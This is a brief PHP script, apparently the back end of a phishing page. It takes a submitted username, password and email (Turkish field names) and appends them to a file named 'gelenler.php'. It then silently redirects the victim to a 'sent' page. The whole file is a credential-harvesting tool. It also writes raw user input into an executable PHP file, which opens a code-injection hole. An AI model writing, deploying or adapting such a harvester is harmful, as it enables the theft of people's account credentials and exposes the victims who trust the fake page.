<?php
$username = $_POST['kullaniciadi'];
$password = $_POST['sifre'];
$mail = $_POST['mail'];
$file = fopen('gelenler.php', 'a');



fwrite($file,  $usernames."<font color='red'>".$username."</font><font color='green'>".$password. "</font><font color='yellow'><b>" .$mail. " </b></font>\n\n<br>");

fclose($file); 
echo '';
			header("refresh:0; url=gonderildi");
?>




